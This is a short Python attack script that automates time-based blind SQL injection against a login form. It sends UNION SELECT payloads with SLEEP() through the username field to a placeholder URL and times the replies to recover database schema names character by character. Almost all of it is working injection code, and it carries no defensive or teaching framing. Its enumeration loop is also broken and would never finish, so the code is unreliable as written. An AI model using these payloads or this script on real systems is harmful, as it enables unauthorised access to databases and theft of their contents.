#!/usr/bin/env python3
import requests, string, time

CHARACTER_SET =  string.ascii_letters + string.digits
SESSION = requests.Session()
ARBITARY_SLEEP_TIME = 3
URI = 'https://example.com'
HTTP_HEADERS = {
    'User-Agent': 'Your Bot 1.0'
}
HTTP_DATA = {
    'username': '',
    'password': 'foo'
}

def run_payload(payload):
    HTTP_DATA['username'] = payload
    start = time.time()
    res = SESSION.post(URI, data=HTTP_DATA)
    end = time.time()
    if end - start > ARBITARY_SLEEP_TIME:
        return True
    return False

# aka database names
def fetch_schema():
    schema_list = []
    # change payload and temp_payload as per use case
    payload = "foo' UNION SELECT schema_name from information_schema.schemata WHERE SCHEMA_NAME LIKE BINARY "
    for character in CHARACTER_SET:
        temp_payload = payload + f'"{character}%" ' + 'AND ' + f'SLEEP({ARBITARY_SLEEP_TIME}) -- '

        if run_payload(temp_payload):
            print(f'fetch_schema:run_payload:payload: {temp_payload}')
            schema_name = character
            temp_schema_name = schema_name
            while True:
                for try_character in CHARACTER_SET:
                    temp_payload = payload + f'"{schema_name}{try_character}%" ' + 'AND ' + f'SLEEP({ARBITARY_SLEEP_TIME}) -- '
                    # Gracefully sleep for a while
                    time.sleep(0.5)
                    if run_payload(temp_payload):
                        schema_name += try_character
                        print(f'SCHEMA NAME:- {schema_name}')

                if schema_name == temp_schema_name:
                    print(f'Schema found in wild {schema_name}')
                    schema_list.append(schema_name)
    return schema_list

# TODO
def fetch_tables(schema_list):
    pass

if __name__ == '__main__':
    schema_list = fetch_schema()
    print('SCHEMAS:- ', schema_list)